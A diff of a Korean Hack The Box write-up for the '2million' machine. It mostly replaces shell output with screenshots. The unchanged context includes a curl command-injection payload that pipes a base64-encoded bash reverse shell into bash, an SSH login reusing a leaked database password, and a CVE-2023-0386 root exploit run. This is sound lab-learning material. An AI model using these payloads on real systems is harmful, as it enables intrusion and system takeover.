@@ -213,15 +213,9 @@ curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
   --header "Content-Type: application/json" \
   --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzEyMzQgMD4mMQ== | base64 -d | bash;"}'
 ```
-
-```text
-www-data@2million:~/html$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+![](/images/htb/20261123-172246.png)
 
 현재 위치: 대상 호스트의 웹 서버 계정 `www-data`
-
-![](/images/htb/20261123-172246.png)
 
 ### 3. 수평 이동 (Lateral Movement)
 
@@ -250,14 +244,9 @@ DB 사용자 이름이 `admin`인데 시스템에도 같은 이름의 계정이 
 ssh admin@2million.htb
 ```
 
-```shell
-admin@ubuntu:~$ id
-uid=1000(admin) gid=1000(admin) groups=1000(admin)
-```
-
-현재 위치: 대상 호스트의 일반 사용자 `admin` (user 플래그는 `/home/admin`에 위치했다.)
-
 ![](/images/htb/20261123-172328.png)
+
+현재 위치: 대상 호스트의 일반 사용자 `admin` (user 플래그는 `/home/admin`에 있다.)
 
 > 핵심 판단: `.env`의 DB 비밀번호와 `admin` 계정의 SSH 비밀번호가 같았다.
 
@@ -303,15 +292,9 @@ make all
 # 터미널 2
 ./exp
 ```
-
-```shell
-root@2million:/tmp/CVE-2023-0386# id
-uid=0(root) gid=0(root) groups=0(root),1000(admin)
-```
-
-현재 위치: 대상 호스트의 `root` (root 플래그는 `/root`)
-
 ![](/images/htb/20261123-172356.png)
+
+현재 위치: 대상 호스트의 `root` (root 플래그는 `/root`에 있다.)
 
 ## 취약점 상세
 
